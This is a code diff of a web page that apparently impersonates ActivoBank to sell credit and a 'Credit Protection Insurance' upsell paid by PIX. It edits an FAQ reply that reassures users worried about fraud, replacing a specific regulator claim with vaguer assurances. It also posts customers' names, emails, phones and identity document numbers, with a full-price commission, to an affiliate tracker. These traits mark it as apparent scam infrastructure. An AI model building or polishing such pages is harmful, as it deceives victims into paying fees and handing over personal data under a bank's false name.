@@ -289,7 +289,7 @@ window.apiUrl = window.apiUrl || function (p) {
         I'm worried this might be fraud.
         <svg class="faq-chevron" width="18" height="18" fill="none" stroke="#9ca3af" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </button>
-      <div class="faq-a">ActivoBank is a bank licensed and regulated by the Bank of Portugal. All credit processes comply with Bank of Portugal and CMVM regulations. Your data and payments are completely secure.</div>
+      <div class="faq-a">ActivoBank is a bank licensed and regulated by the relevant European financial authorities. All credit processes comply with applicable EU banking and securities regulations. Your data and payments are completely secure.</div>
     </div>
 
     <div class="faq-item">
@@ -375,7 +375,7 @@ async function sendUtmify(status,orderId,createdAt,approvedDate){
   try{
     await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'pix',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
-        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
+        customer:{name:nome,email,phone:phone||null,document:doc,country:(localStorage.getItem('phoneCountryIso')||'PT')},
         products:[{id:'seguro-protecao-credito',name:'Credit Protection Insurance — ActivoBank Credit',planId:null,planName:'upsell 6',quantity:1,priceInCents:cents}],
         trackingParameters:getUtmParams(),
         commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
